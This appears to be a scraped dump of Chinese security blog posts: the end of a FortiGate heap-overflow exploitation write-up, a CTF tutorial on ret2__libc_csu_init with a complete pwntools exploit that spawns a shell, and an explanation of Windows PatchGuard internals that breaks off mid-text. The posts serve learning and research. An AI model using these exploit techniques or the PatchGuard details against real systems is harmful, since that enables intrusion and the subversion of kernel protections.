值，看看能否将内存分配到 0x7f 的高地址。\n经过测试，当 CL 等于 0x100821000 时，SSL 结构体地址：\n\n发生崩溃时的状态：\n\n此时数据被拷贝到 0x7f 的高地址，对应内存布局：\n\n这样可控的数据恰好位于 SSL 结构体之上且两个内存块之间不存在间隙，可以通过溢出去覆盖其内部变量。\n我们观察到 SSL 结构体地址是 0x7f5aee9b8000，而内存块起始地址为 0x7f5aee800000，两者之间还存在大小为 0x1b8000 的其他数据，再查看栈回溯信息和崩溃现场，代码尝试从 0x9e9f1df98d3a1000 地址取值，这显然不是一个正常地址，看起来像经过某种运算后得到的指针。\n尝试修改发送的请求数据，发现这个值和我们的输入有关，并且根据 jemalloc 内存管理算法确定，SSL 结构体之上的数据可能是 jemalloc 中的一些关键变量。\n当发送某特定值时，可以让以上计算得到一个合法的地址，防止非法地址访问崩溃。在填充到 SSL 结构体之前的数据中还存在数个类似的地址计算过程，依次布置好相关数据就能绕过。\n接着覆盖 SSL 结构体，尝试在其中填充随机数据得到以下崩溃：\n\n在对应位置填充一个合法地址，继续执行：\n\n代码用 EVP_CIPHER_flags 函数取值并 call rax 跳转到对应位置。如果可以找到一个合适的目标地址，就能劫持控制流来执行进一步利用。\n所谓合适的目标地址，即能否利用程序中的代码片段，将栈迁移到可控内存，构造 ROP 链完成后续利用。在 init 程序中存在一个叫做 ENGINE_ctrl 的函数，其内容如下：\n\n此函数会从参数中获取一些变量，判断之后将取出的值作为函数指针去调用。这个函数地址位于 GOT 表中，且查看 call rax 时寄存器状态发现第一个参数的地址中包含可控数据。我们将 EVP_CIPHER_flags 的地址指向 ENGINE_ctrl 函数，这样就可以将一个只能部分控制程序执行流的情况转变成了完全控制程序执行流。\n当执行指针跳转时 RBP 寄存器恰好指向我们可控的数据，这里利用 push_rbp_pop_rsp 实现栈迁移，迁移之后就可以按照常规思路进行 ROP 完成利用。\n具体实现可以看我GitHub\n参考https://www.fortiguard.com/psirt/FG-IR-23-001;https://wanghenshui.github.io/2019/05/01/jemalloc.html;\n","categories":["二进制安全"],"tags":["ROP","堆溢出","Fortinet"]},{"title":"ROP-ret2__libc_csu_init（64位ELF）","url":"/2020/08/15/ROP-ret2__libc_csu_init%EF%BC%8864%E4%BD%8DELF%EF%BC%89/","content":"示例文件\n64位传参（函数调用约定）首先说一下64位文件的传参方式：\n当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。\n当参数为7个以上时， 前 6 个与前面一样， 但后面的依次 放入栈中，即和32位程序一样\n比如参数大于7个的时候function_1(a,b,c,d,e,f,g,h)a-&gt;%rdi, b-&gt;%rsi, c-&gt;%rdx, d-&gt;%rcx, e-&gt;%r8, f-&gt;%r9h-&gt;(%esp)g-&gt;(%esp)call H\n\n利用原理在 64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的gadgets。\n这时候，我们可以利用 x64 下的 __libc_csu_init 中的 gadgets。这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。\n我们先来看一下这个函数(当然，不同版本的这个函数有一定的区别)，将程序扔到IDA中，其汇编代码如下：\n\n这里我们可以利用以下几点：\n从 0x000000000040061A 一直到结尾，我们可以利用栈溢出构造栈上数据来控制 rbx,rbp,r12,r13,r14,r15 寄存器的数据（因为都是向寄存器进行pop）。对应的汇编如下：\n\n从 0x0000000000400600 到 0x0000000000400609，我们可以将 r13 赋给 rdx,将 r14 赋给 rsi，将 r15 赋给 edi\n需要注意的是，虽然这里赋给的是 edi，但其实此时 rdi 的高 32 位寄存器值为 0（自行调试），所以其实我们可以控制 rdi 寄存器的值，只不过只能控制低 32 位\n而这三个寄存器，也是 x64 函数调用中传递的前三个寄存器（rdx、rsi、edi）。此外，如果我们可以合理地控制 r12 与 rbx，那么我们就可以调用我们想要调用的函数。比如说我们可以控制 rbx 为 0，r12 为存储我们想要调用的函数的地址。对应的汇编如下：\n\n从 0x000000000040060D 到 0x0000000000400614，我们可以控制 rbx 与 rbp 之间的关系为rbx+1 &#x3D; rbp，这样我们就不会执行 loc_400600，进而可以继续执行下面的汇编程序。这里我们可以简单的设置rbx&#x3D;0，rbp&#x3D;1。对应的汇编代码如下：\n\n分析到这里，差不多可以进入正题了。\n做题\n64位程序，开了NX保护，main函数如下：\n\n进入 vulnerable_function 函数：\n\n发现一个read函数，这是一个简单的栈溢出函数，\n\nssize_t read(int fd,void*buf,size_t count)参数说明：fd: 是文件描述符buf:为读出数据的缓冲区；count:为每次读取的字节数（是请求读取的字节数，读上来的数据保存在缓冲区buf中，同时文件的当前读写位置向后移）成功：返回读出的字节数失败：返回-1，并设置errno，如果在调用read之前到达文件末尾，则这次read返回0\n\n\n首先在IDA里看一下read函数的栈偏移（覆盖返回地址）：0x88，为了防止IDA不准确导致错误，因此手动测量一下：\n利用cyclic工具生成不规则字符串（仔细看挺规则的）\n\npwngdb开始调试，执行如下操作：\n\n利用rsp寄存器找偏移：\n\n\nx&#x2F;wx $rsp # 以16进制显示指定rsp寄存器中的数据\n\n栈偏移为136，与IDA测的0x88相等\n从IDA里可以看到，没有system函数，但有一个已知的write函数，我们可以利用这个函数并利用libc泄露出程序加载到内存后的地址（当然也可以选用__libc_start_main）。\n首先寻找write函数在内存中的真实地址：\npythonfrom pwn import *p = process(&#x27;./level5&#x27;)elf = ELF(&#x27;level5&#x27;)pop_addr = 0x40061a          write_got = elf.got[&#x27;write&#x27;]mov_addr = 0x400600main_addr = elf.symbols[&#x27;main&#x27;]p.recvuntil(b&#x27;Hello, World\\n&#x27;)payload0 = b&#x27;A&#x27;*136 + p64(pop_addr) + p64(0) + p64(1) + p64(write_got) + p64(8) + p64(write_got) + p64(1) + p64(mov_addr) + b&#x27;a&#x27;*(0x8+8*6) + p64(main_addr)p.sendline(payload0)write_start = u64(p.recv(8))print(&quot;write_addr_in_memory_is &quot;+hex(write_start))\n\n解释一下这里的payload0\npythonpayload0 = &#x27;A&#x27;*136 + p64(pop_addr) + p64(0) + p64(1) + p64(write_got) + p64(8) + p64(write_got) + p64(1) + p64(mov_addr) + b&#x27;a&#x27;*(0x8+8*6) + p64(main_addr)\n\n首先输入136个字符使程序发生栈溢出，然后让pop_addr覆盖栈中的返回地址，使程序执行pop_addr地址处的函数，并分别将栈中的0、1、write_got函数地址、8、write_got、1分别pop到寄存器rbx、rbp、r12、r13、r14、r15中去，之后将pop函数的返回地址覆盖mov_addr的地址为，如下：\n\n注意：payload发送的内容都在栈上或堆上，这得看你的变量在栈上还是堆上，具体情况具体分析\n\n\n解释一下payload中两个write_got函数的作用：\n在布置完寄存器后，由于有 call qword ptr [r12+rbx*8] 它调用了write函数，其参数为write_got函数地址（r14寄存器，动调一下就知道了），写成C语言类似于：write(write_got函数地址)&#x3D;&#x3D;printf（write_got函数地址），再使用u64(p.recv(8))接受数据并print出来就行了\n之后程序转向mov_addr函数，利用mov指令布置寄存器rdx，rsi，edi\n\n\nJNZ(或JNE)(jump if not zero, or not equal)，汇编语言中的条件转移指令。结果不为零(或不相等)则转移。\n\n这里rbx和rbp都等于1，他们相等，所以继续执行payload代码（main_addr）,而不是去执行loc_400600\n从整体上来看，我们输入了 ‘A’136，利用payload0对寄存器布局之后又重新回到了main函数再说说’a’(0x8+8*6)的作用：它的作用就是为了平衡堆栈也就是说，当mov_addr执行完之后，按照流程仍然会执行地址400616处的函数，我们并不希望它执行到这个函数（因为他会再次pop寄存器更换我们布置好的内容），所以为了堆栈平衡，我们使用垃圾数据填充此处的代码（栈区和代码区同属于内存区域，可以被填充），如下图所示：\n\n用垃圾数据填充地址0x16-0x22的内容，最后将main_addr覆盖ret，从而执行main_addr处的内容\n\n这道题目我们使用系统中自带的libc.so.6文件请注意：当程序加载的时候会寻找同目录下的libc.so.6文件，如果存在，则会自动加载，而不会去加载系统自带的libc文件\n\n这样，我们就获得了write函数真实地址。\n由此，第二部分EXP如下\nPythonlibc = ELF(&#x27;/usr/lib/x86_64-linux-gnu/libc.so.6&#x27;)#libc=ELF(&#x27;libc.so.6&#x27;)libc_base=write_start-libc.symbols[&#x27;write&#x27;]system_addr=libc.symbols[&#x27;system&#x27;]+libc_basebinsh=next(libc.search(&#x27;/bin/sh&#x27;))+libc_baseprint(&quot;libc_base_addr_in_memory_is &quot;+hex(libc_base))print(&quot;system_addr_in_memory_is &quot;+hex(system_addr))print(&quot;/bin/sh_addr_in_memory_is &quot;+hex(binsh))pop_rdi_ret=0x400623payload=b&#x27;a&#x27;*0x88+p64(pop_rdi_ret)+p64(binsh)+p64(system_addr)p.send(payload)p.interactive()\n\n当我们获得write函数的真实地址之后，就可以计算出libc文件的基址，从而可以计算出system函数和&#x2F;bin&#x2F;sh字符串在内存中的地址，从而利用它。\n接下来解释一下第二个payload的意思：\npayload=b&#x27;a&#x27;*0x88+p64(pop_rdi_ret)+p64(binsh)+p64(system_addr)\n\n当程序重新执行到main函数时，我们利用栈溢出让返回地址被pop_rdi_ret覆盖，从而程序执行pop_rdi_ret。\n\n注意，当我们send payload之后，pop_rdi_ret、binsh和system_addr被送到了栈中，利用gadgets：pop rdi;ret 将栈中的binsh地址送往rdi寄存器中（也就是说pop_rdi_ret的参数是地址binsh），然后将system函数地址覆盖到ret，程序就会执行此system函数。当system函数执行的时候会利用到rdi里的参数，动态调试一下就知道了。\n\n完整的exp如下：\npythonfrom pwn import *p = process(&#x27;./level5&#x27;)elf = ELF(&#x27;level5&#x27;)pop_addr = 0x40061a          write_got = elf.got[&#x27;write&#x27;]mov_addr = 0x400600main_addr = elf.symbols[&#x27;main&#x27;]p.recvuntil(b&#x27;Hello, World\\n&#x27;)payload0 = b&#x27;A&#x27;*136 + p64(pop_addr) + p64(0) + p64(1) + p64(write_got) + p64(8) + p64(write_got) + p64(1) + p64(mov_addr) + b&#x27;a&#x27;*(0x8+8*6) + p64(main_addr)p.sendline(payload0)write_start = u64(p.recv(8))print(&quot;write_addr_in_memory_is &quot;+hex(write_start))libc = ELF(&#x27;/usr/lib/x86_64-linux-gnu/libc.so.6&#x27;)#libc=ELF(&#x27;libc.so.6&#x27;)libc_base=write_start-libc.symbols[&#x27;write&#x27;]system_addr=libc.symbols[&#x27;system&#x27;]+libc_basebinsh=next(libc.search(b&#x27;/bin/sh&#x27;))+libc_baseprint(&quot;libc_base_addr_in_memory_is &quot;+hex(libc_base))print(&quot;system_addr_in_memory_is &quot;+hex(system_addr))print(&quot;/bin/sh_addr_in_memory_is &quot;+hex(binsh))pop_rdi_ret=0x400623payload=b&#x27;a&#x27;*0x88+p64(pop_rdi_ret)+p64(binsh)+p64(system_addr)p.send(payload)p.interactive()\n\n参考资料https://cloud.tencent.com/developer/article/1345756;\nhttps://blog.csdn.net/king_cpp_py/article/details/79483152;\nhttps://www.yuque.com/u239977/cbzkn3/vty6x0;\n","categories":["二进制安全"],"tags":["ROP","CTF"]},{"title":"PatchGuard 工作原理","url":"/2024/10/13/PatchGuard%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/","content":"PatchGuard 介绍PatchGuard 在 64 位 Windows 操作系统中的安全措施，它阻止了内核级 rootkit 和其他恶意软件操纵关键系统代码和结构。 它的运作方式是通过定期监控内核来识别任何非法修改并立即阻止。 PatchGuard 的目的是维护操作系统的完整性并确保其以最佳水平运行，从而提高系统的整体安全性和稳定性。 PatchGuard 验证内核代码和数据结构并强制执行数字签名。 在 PatchGuard 的限制范围内，开发者必须确保合规性和安全设计，以便与内核无缝运行。\n初始化KiFilterFiberContextPatchGuard 的初始化过程主要由 KiFilterFiberContext 函数执行，该函数初始化 PatchGuard 的上下文和验证机制。 KiFilterFiberContext 在启动过程中被调用两次，其中一种方法涉及称为 KiAmd64SpecificState 的异常处理程序。 为了触发异常处理程序并执行 KiFilterFiberContext，在启动过程开始时会故意触发，除法错误。 用于计算除法的两个值是已知符号，KdDebuggerNotPresent 和 KdPitchDebugger ,用于确定是否附加了调试器。 如果存在调试器，则不会初始化 PatchGuard。 在正常情况下，这两个符号的值设置为 1，这会导致 idiv 指令计算值 rax&#x3D;0x80000000、rdx&#x3D;0x80000000 和 r8d&#x3D;0xffffffff。 此除法的计算导致除法错误，从而触发 KiDivideErrorFault 函数执行 KiFilterFiberContext 函数。 KiFilterFiberContext 负责调用创建 PatchGuard 上下文的初始化过程，并使用特定参数。值得注意的是，其中一个参数被硬编码为 0，这表明它可能从其他地方调用。但实际上，另一个初始化过程已经开始，它指向函数。\nExpLicenseWatchInitWorker在启动过程中在 KeInitAmd64SpecificState 之前调用。 它是 Microsoft PatchGuard 的一部分，用于验证 Microsoft 许可证的真实性。 调用堆栈显示 ExInitSystemPhase2 调用与许可证验证相关的ExpGetNtProductTypeFromLicenseValue。ExpLicenseWatchInitWorker 随后调用 KiFilterFiberContext，但概率只有 4%，使用 rdtsc 指令生成的随机值。ExpLicenseWatchInitWorker 包括一些检查，用于检查是否存在调试器和安全启动模式，这些都是常见的安全措施。该函数的返回值是 rdtsc 指令生成的随机值乘以常数值 0x51eb851f。如果 InitIsWinPEMode 为真，则随机返回的值稍后将用作索引。KiFilterFiberContext 的调用使用从 PRCB（进程寄存器控制块）获取的值构建的结构，特别是 HalReserved 字段，以及指向 KiFilterFiberContext 的指针，然后立即清除这些字段。ExpLicenseWatchInitWorker 分别将 KiFilterParam 和 pKiFilterFiberContext 指针设置为 Prcb.HalReserved[6] 和 Prcb.HalReserved[5]。如果 InitSafeBootMode 不为 0 或 KUSER_SHARED_DATA.KdDebuggerEnabled &gt;&gt; 1，则返回 rand_stuff。否则，如果 random(0,100) ≤ 4，则调用 KiFilterFiberContext(pKiFilterFiberParam)。KiFilterParam 和 pKiFilterFiberContext 这两个指针在启动开始时在函数 KiLockServiceTable 中设置。KiLockServiceTable 填充 HalReserved 字段，第一个要填充的 HalReserved 字段是第 6 个。 KiServiceTablesLocked 持有的结构名为 KI_FILTER_FIBER_PARAM，是 KiFilterFiberContext 函数的一个参数。KI_FILTER_FIBER_PARAM 结构包括 code_prefetch_rcx_retn、padding、pPsCreateSystemThread 和 pKiBalanceSetManagerPeriodicDpc。\nPatchGuard Contextstruct PatchGuardContext&#123;constexpr auto  CmpAppendDllSection[];constexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;constexpr auto  nt!ExAcquireResourceSharedLiteconstexpr auto  nt!ExAcquireResourceExclusiveLiteconstexpr auto  nt!ExAllocatePoolWithTagconstexpr auto  nt!ExFreePoolconstexpr auto  nt!ExMapHandleToPointerconstexpr auto  nt!ExQueueWorkItemconstexpr auto  nt!ExReleaseResourceLiteconstexpr auto  nt!ExUnlockHandleTableEntryconstexpr auto  nt!ExAcquirePushLockExclusiveExconstexpr auto  nt!ExReleasePushLockExclusiveExconstexpr auto  nt!ExAcquirePushLockSharedExconstexpr auto  nt!ExReleasePushLockSharedExconstexpr auto  nt!KeAcquireInStackQueuedSpinLockAtDpcLevelconstexpr auto  nt!ExAcquireSpinLockSharedAtDpcLevelconstexpr auto  nt!KeBugCheckExconstexpr auto  nt!KeDelayExecutionThreadconstexpr auto  nt!KeEnterCriticalRegionThreadconstexpr auto  nt!KeLeaveCriticalRegionconstexpr auto  nt!KeEnterGuardedRegionconstexpr auto  nt!KeLeaveGuardedRegionconstexpr auto  nt!KxReleaseQueuedSpinLockconstexpr auto  nt!ExReleaseSpinLockSharedFromDpcLevelconstexpr auto  nt!KeRevertToUserGroupAffinityThreadconstexpr auto  nt!KeProcessorGroupAffinityconstexpr auto  nt!KeInitializeEnumerationContextconstexpr auto  nt!KeEnumerateNextProcessorconstexpr auto  nt!KeCountSetBitsAffinityExconstexpr auto  nt!KeQueryAffinityProcessconstexpr auto  nt!KeQueryAffinityThreadconstexpr auto  nt!KeSetSystemGroupAffinityThreadconstexpr auto  nt!KeSetCoalescableTimerconstexpr auto  nt!ObfDereferenceObjectconstexpr auto  nt!ObReferenceObjectByNameconstexpr auto  nt!RtlImageDirectoryEntryToDataconstexpr auto  nt!RtlImageNtHeaderconstexpr auto  nt!RtlLookupFunctionTableconstexpr auto  nt!RtlPcToFileHeaderconstexpr auto  nt!RtlSectionTableFromVirtualAddressconstexpr auto  nt!DbgPrintconstexpr auto  nt!MmAllocateIndependentPagesconstexpr auto  nt!MmFreeIndependentPagesconstexpr auto  nt!MmSetPageProtectionconstexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;constexpr auto  nt!RtlLookupFunctionEntryconstexpr auto  nt!KeAcquireSpinLockRaiseToDpcconstexpr auto  nt!KeReleaseSpinLockconstexpr auto  nt!MmGetSessionByIdconstexpr auto  nt!MmGetNextSessionconstexpr auto  nt!MmQuitNextSessionconstexpr auto  nt!MmAttachSessionconstexpr auto  nt!MmDetachSessionconstexpr auto  nt!MmGetSessionIdExconstexpr auto  nt!MmIsSessionAddressconstexpr auto  nt!MmIsAddressValidconstexpr auto  nt!MmSessionGetWin32Calloutsconstexpr auto  nt!KeInsertQueueApcconstexpr auto  nt!KeWaitForSingleObjectconstexpr auto  unknown;constexpr auto  nt!ExReferenceCallBackBlockconstexpr auto  nt!ExGetCallBackBlockRoutineconstexpr auto  nt!ExDereferenceCallBackBlockconstexpr auto  nt!KiMarkBugCheckRegions+0x3c0constexpr auto  nt!PspEnumerateCallbackconstexpr auto  nt!CmpEnumerateCallbackconstexpr auto  nt!DbgEnumerateCallbackconstexpr auto  nt!ExpEnumerateCallbackconstexpr auto  nt!ExpGetNextCallbackconstexpr auto  nt!EmpCheckErrataListconstexpr auto  nt!KiSchedulerApcTerminateconstexpr auto  nt!KiSchedulerApcconstexpr auto  nt!EmpCheckErrataListconstexpr auto  nt!KiSwInterruptDispatch+0xfd0constexpr auto  nt!MmAllocatePagesForMdlExconstexpr auto  nt!MmAllocateMappingAddressconstexpr auto  nt!MmMapLockedPagesWithReservedMappingconstexpr auto  nt!MmUnmapReservedMappingconstexpr auto  nt!KiSwInterruptDispatch+0xd220constexpr auto  nt!KiSwInterruptDispatch+0xd290constexpr auto  nt!MmAcquireLoadLockconstexpr auto  nt!MmReleaseLoadLockconstexpr auto  nt!KeEnumerateQueueApcconstexpr auto  nt!KeIsApcRunningThreadconstexpr auto  nt!KiSwInterruptDispatch+0xeb0constexpr auto  nt!PsAcquireProcessExitSynchronizationconstexpr auto  nt!ObDereferenceProcessHandleTableconstexpr auto  nt!PsGetNextProcessconstexpr auto  nt!PsQuitNextProcessconstexpr auto  nt!PsGetNextProcessExconstexpr auto  nt!MmIsSessionLeaderProcessconstexpr auto  nt!PsInvokeWin32Calloutconstexpr auto  nt!MmEnumerateAddressSpaceAndReferenceImagesconstexpr auto  nt!PsGetProcessProtectionconstexpr auto  nt!PsGetProcessSignatureLevelconstexpr auto  nt!PsGetProcessSectionBaseAddressconstexpr auto  nt!SeCompareSigningLevelsconstexpr auto  nt!KeComputeSha256constexpr auto  nt!KeComputeParallelSha256constexpr auto  nt!KeSetEventconstexpr auto  nt!RtlpConvertFunctionEntryconstexpr auto  nt!RtlpLookupPrimaryFunctionEntryconstexpr auto  nt!RtlIsMultiSessionSkuconstexpr auto  nt!KiEnumerateCallbackconstexpr auto  nt!KeStackAttachProcessconstexpr auto  nt!KeUnstackDetachProcessconstexpr auto  nt!KeIpiGenericCallconstexpr auto  nt!KiSwInterruptDispatch+0xd070constexpr auto  nt!MmGetPhysicalAddressconstexpr auto  nt!MmUnlockPagesconstexpr auto  nt!VslVerifyPageconstexpr auto  nt!KiGetInterruptObjectAddressconstexpr auto  unknown;constexpr auto  nt!PsLookupProcessByProcessIdconstexpr auto  nt!PsGetProcessIdconstexpr auto  nt!MmCheckProcessShadowconstexpr auto  nt!MmGetImageRetpolineCodePageconstexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;constexpr auto  nt!matherr_flag+0x8constexpr auto  nt!TriageImagePageSize+0xa4constexpr auto  nt!TriageImagePageSize+0xacconstexpr auto  nt!TriageImagePageSize+0xb4constexpr auto  unknown;constexpr auto  unknown;constexpr auto  nt!KiEntropyTimingRoutineconstexpr auto  nt!KiProcessListHeadconstexpr auto  nt!KiProcessListLockconstexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;constexpr auto  nt!PsActiveProcessHeadconstexpr auto  nt!PsInvertedFunctionTableconstexpr auto  nt!PsLoadedModuleListconstexpr auto  nt!PsLoadedModuleResourceconstexpr auto  nt!PsLoadedModuleSpinLockconstexpr auto  nt!PspActiveProcessLockconstexpr auto  nt!PspCidTableconstexpr auto  nt!ExpUuidLockconstexpr auto  nt!AlpcpPortListLockconstexpr auto  nt!KeServiceDescriptorTableconstexpr auto  nt!KeServiceDescriptorTableShadowconstexpr auto  nt!KeServiceDescriptorTableFilterconstexpr auto  nt!VfThunksExtendedconstexpr auto  nt!PsWin32CallBackconstexpr auto  nt!TriageImagePageSize+0x84constexpr auto  nt!KiTableInformationconstexpr auto  nt!HandleTableListHeadconstexpr auto  nt!HandleTableListLockconstexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;constexpr auto  nt!SeProtectedMappingconstexpr auto  unknown;constexpr auto  nt!KiStackProtectNotifyEventconstexpr auto  unknown;constexpr auto  nt!MmFreeIndependentPages  (nt+0x0)constexpr auto  hal!EmonQueryInformation  (hal+0x0)constexpr auto  nt!KeNumberProcessorsconstexpr auto  unknown;constexpr auto  unknown;constexpr auto  nt!RtlpInvertedFunctionTableconstexpr auto  nt!KiIsrThunkShadowconstexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;constexpr auto  unknown;    // INCOMPL:FOR REF&#125;;\n\nPatchGuard 上下文结构分为三个部分。 第一部分包含 PatchGuard 机制的核心内容。第二部分是数据接收者，用于保存原始数据，而第三部分则包含有关要检查的数据的信息。第一部分 结构的第一部分包括函数 CmpAppendDllSection 的代码，该代码直接复制到结构中，并在 PatchGuard 触发完整性检查时使用。此代码的主要功能是使用随机生成的密钥解密 PatchGuard 上下文结构的其余部分。该部分还包含来自 ntoskrnl API 的许多函数指针，这些指针以这种方式保存，以便 PatchGuard 例程可以独立于重定位去使用它们。\n第一部分结构的第一部分包含函数 CmpAppendDllSection 的代码，该代码直接复制到结构中，并在 PatchGuard 触发完整性检查时使用。此代码的主要功能是使用随机生成的密钥解密 PatchGuard 上下文结构的其余部分。该部分还包含来自 ntoskrnl API 的许多函数指针，这些指针以这种方式保存，以便 PatchGuard 例程可以独立于重定位使用它们。\n结构的第二部分包含许多对全局变量的引用，例如 KiWaitAlways 和 KiWaitNever。这些值在启动时随机初始化，用于编码和解码 PatchGuard DPC 指针。此外，它还包含指向另一个 PatchGuard 上下文结构的指针，该指针多次用作结构的干净备份。它也是此全局指向的结构，在发生 KeBugCheck 时发送，如 KiMarkBugCheckRegion 中所示。\n最后，该结构的第三部分包括公共变量，例如 Ntoskrnl 和 Hal 基地址、当前 PRCB 和最大虚拟寻址大小。它还包括运行时变量，例如为“检查会话”检查的数据总量。关键结构校验和所需的数据在每次校验和之后都会增加其大小，并与最大值进行比较。此外，使用 rdtsc 随机初始化用于关键结构校验和的初始化向量以及用于在每个块迭代中导出初始化向量的移位值。最后，PatchGuard 上下文的校验和存储在其自身中，用于检测任何损坏。\n第二部分该结构的第二部分包含稍后将使用的数据。在 Windows 中，条目保存在结构的这一部分中以防止绕过。这些条目包括 PTE（在触发 KeBugCheck 之前恢复）以及关键内核例程，例如 Hal、Ntoskrnl 和 RtlpBreakWithStatusInstruction&#x2F;DbgBreakPointWithStatus 等。每个例程都由其在结构中的相应偏移量标识，并附带其大小，以便恢复例程知道要重写多少。\n第三部分PatchGuard 上下文结构的第三部分包含一个结构数组，其中包含需要执行的每个检查的信息。每个结构都有一个 KeBugCheckType 字段，用于区分正在检查的结构类型，例如 IDT 或 GDT。该结构还包含指向要检查的数据的指针、其大小以及在 PatchGuard 初始化期间计算的校验和，作为完整性检查的参考。此外，结构中还有针对每种检查类型的特定条目，例如 IDT 检查的目标处理器。结构数组存储在 PatchGuard 上下文结构中，结构第一部分中的几个条目提供了重要信息。这些条目包括数组中关键结构的总数、要进行校验和的下一个关键结构的偏移量、第一个关键结构数据的偏移量以及当前已检查的结构数量。PatchGuard 在其检查算法中使用这些信息。\n初始化阶段上下文的初始化主要通过名为 KiInitPatchGuardContext 的函数进行，该函数虽然未命名，但在现有文献中已有记载。但是，还有其他初始化 PatchGuard 上下文的方法，并且在某些情况下，会为系统检查目的建立单独的机制。\n不同的初始化方法如前所述，KiInitPatchGuardContext 函数负责初始化大多数 PatchGuard 上下文，方法的选择由函数参数决定。这些参数通常是随机选择的，如 KiFilterFiberContext 概述中所述。在本节中，我们将研究传递给此函数的参数以及它们如何确定 PatchGuard 检查的初始化和触发。\n函数参数如下：\n\nArg 1：DPC 方法的索引\nArg 2：调度方法\nArg 3：用于确定要检查的最大大小的随机值\nArg 4：指向来自 ExpLicenseWatchInitWorker 的结构的指针（可能性低）\nArg 5：布尔值，用于决定是否必须检查 NT 例程的完整性\n\n在这些参数中，第 2 个参数（调度方法）和第 4 个参数（允许使用其他调度方法）是最重要的。在 KiFilterFiberContext 中，随机值用作第二个参数的索引，该索引决定要使用的方法。在下一节中，我们将描述 KiInitPatchGuardContext 可以与第 4 个参数结合使用的各种方法。\n已知方法KiInitPatchGuardContext 可以使用不同的方法来初始化 PatchGuard 检查。\n第一种方法涉及插入与 DPC 链接的计时器。 PatchGuard 初始化一个 PatchGuard Context 结构和一个 DPC 结构并将其设置在计时器结构中。计时器与 KeSetCoalescableTimer 一起排队，并将在调用后 2 到 2’10” 之间从第一个参数触发 DPC。TolerableDelay 参数是 0 到 0.001 秒之间的随机值。此计时器不是周期性的，需要在检查例程结束时恢复。\n第二种和第三种方法涉及将 DPC 隐藏在内核结构 PRCB 中，而不是使用计时器。如果 KiInitPatchGuardContext 的第二个参数为 1 或 2，PatchGuard 将初始化上下文结构和 DPC 结构并将其隐藏在 PRCB 中。系统中的合法函数负责排队 DPC。\n对于方法 1，指向 DPC 的指针隐藏在 PRCB 的 AcpiReserved 字段中。它在 HalpTimerDpcRoutine 中排队，并检查每次检查之间是否至少经过了两分钟。全局变量 HalpTimerLastDpc 跟踪上次排队的时间，其值取自全局变量，与正常运行时间有关。当发生某个 ACPI 事件（例如转换为空闲状态）时，将调用 HalpTimerDpcRoutine。\n对于方法 2，指向 DPC 的指针隐藏在 PRCB 的 HalReserved 字段中。它由 HalpMcaQueueDpc 排队，最短周期也是 2 分钟，并在发生 HAL 定时器时钟中断时进行检查，请参阅 HalpTimerClockInterrupt&#x2F;HalpTimerAlwaysOnClockInterrupt。有趣的是当从 ExpLicenseWatchInitWorker 调用 KiFilterFiberContext 时，此字段还用于保留指向结构 KI_FILTER_FIBER_PARAM 的指针。\n对于方法 3，它涉及使用指向 KI_FILTER_FIBER_PARAM 结构的指针创建一个新的系统线程，这种情况发生的概率仅为 4%。 KI_FILTER_FIBER_PARAM 结构包含指向 PsCreateSystemThread 函数的指针，该函数用于创建新的系统线程。新创建的线程的 StartAddress 设置为指向 PatchGuard 验证例程的存根函数。此线程创建直接在 KiInitPatchGuardContext 函数中启动。使用了一种有趣的混淆技术，PatchGuard 在线程创建后立即将相应 ETHREAD 结构的 StartAddress 和 Win32StartAddress 字段修改为通用函数指针，以避免被检测到。为此，PatchGuard 获取 0 到 7 之间的随机值，并从内存中特定偏移量的函数名称数组中获取函数指针。在数组中的七个可能函数中，只有最后一个是设置 StartAddress 和 Win32StartAddress 字段的正确函数。\n对于方法 4，初始化 PatchGuard Context 结构和 APC 结构，然后将其插入现有系统线程，并将 NormalRoutine 参数设置为 xHalTimerWatchdogStop，这只是一个“ret 0”指令。将 KernelRoutine 设置为 KiDispatchCallout，它将调用验证例程，RundownRoutine 为 NULL。使用带有回调的 PsEnumProcessThreads 选择要附加的系统线程，该回调会查询线程起始地址并将结果与​​ PopIrpWorkerControl 进行比较。如果找到匹配的线程，则\n对于方法 5，需要有效的 KI_FILTER_FIBER_PARAM 结构，否则 KiInitPatchGuardContext 将回退到方法 0。结构的最后一项将被使用，它是指向全局变量 KiBalanceSetManagerPeriodicDpc 的指针。此变量包含 KDPC 结构，其 DPC 例程在函数 KiInitSystem 中初始化。此方法涉及挂接系统每秒左右由 KeClockInterruptNotify 排队的合法 DPC。PatchGuard 挂接此合法 DPC，以便每 120 个队列（或 120 到 130 之间的随机值），PatchGuard DPC 都会排队。如果 PatchGuard DPC 排队，它首先会清除全局 DPC 的副本，并让验证例程在检查结束时将其重新设置。\n实际上还有更多方法，但本文只介绍到此。\n全局上下文初始化当使用索引 7 调用 KiInitPatchGuardContext 时，将初始化全局 